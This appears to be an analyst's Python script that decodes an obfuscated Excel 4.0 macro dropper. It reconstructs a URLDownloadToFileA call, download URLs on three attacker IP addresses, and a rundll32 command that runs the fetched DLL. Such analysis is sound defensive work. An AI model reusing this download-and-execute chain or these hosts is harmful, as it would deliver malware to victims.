#!/usr/bin/env python3
# Fully reconstruct every concatenated string in the macros by resolving cell refs.
ss = ["R","L","M","o","n","D","w","l","a","d","T","F","i","e","J","C","B","HERTY","A","http://","188.127.227.99/","45.150.67.29/"]
# cell -> shared string char (from t="s" cells)
cells = {
 "A1":ss[19],
 "AH87":ss[19],
 "AL99":ss[0],"AL100":ss[1],"AL101":ss[5],"AL102":ss[3],"AL103":ss[6],"AL104":ss[4],
 "AK105":ss[14],"AL105":ss[7],"AK106":ss[14],"AL106":ss[3],"AK107":ss[15],"AL107":ss[8],
 "AK108":ss[15],"AL108":ss[9],"AK109":ss[16],"AL109":ss[10],"AK110":ss[16],"AL110":ss[3],
 "AL111":ss[11],"AK112":ss[17],"AL112":ss[12],"AL113":ss[7],"AL114":ss[13],"AL115":ss[18],
 "AK117":ss[2],
 "Z400":ss[20],"Z401":ss[21],
 "Z402":"195.123.213.126/",
 "AO262":"<NOW().dat>",
}
def c(ref): return cells.get(ref,f"<{ref}>")

# AO265: FORMULA.FILL("," & AL101 AL113 AL113 AL99 AL114 & "gisterServer", AP265)
ap265 = ","+c("AL101")+c("AL113")+c("AL113")+c("AL99")+c("AL114")+"g"+"i"+"s"+"t"+"e"+"r"+"S"+"e"+"r"+"v"+"e"+"r"
print("AP265 (=,DllRegisterServer?):", ap265)

# AO271 REGISTER(module, proc, types, alias,,1,9)
module = "U"+c("AL99")+c("AL100")+c("AK117")+c("AL110")+c("AL104")
proc   = "U"+c("AL99")+c("AL100")+c("AL101")+c("AL102")+c("AL103")+c("AL104")+c("AL105")+c("AL106")+c("AL107")+c("AL108")+c("AL109")+c("AL110")+c("AL111")+c("AL112")+c("AL113")+c("AL114")+c("AL115")
types  = c("AK105")+c("AK106")+c("AK107")+c("AK108")+c("AK109")+c("AK110")
alias  = c("AK112")
print("REGISTER module:", module)
print("REGISTER proc  :", proc)
print("REGISTER types :", types)
print("REGISTER alias :", alias)

# HERTY(0, AH87 & Z400 & AO262, "..\\Fol.doka",0,0)
for z in ["Z400","Z401","Z402"]:
    print(f"download url ({z}):", c("AH87")+c(z)+c("AO262"))

# sheet2 Y211 = AL99 & "undll32 "
y211 = c("AL99")+"undll32 "
print("Y211 (rundll cmd):", y211)
print("EXEC:", y211+"..\\Fol.doka"+ap265)
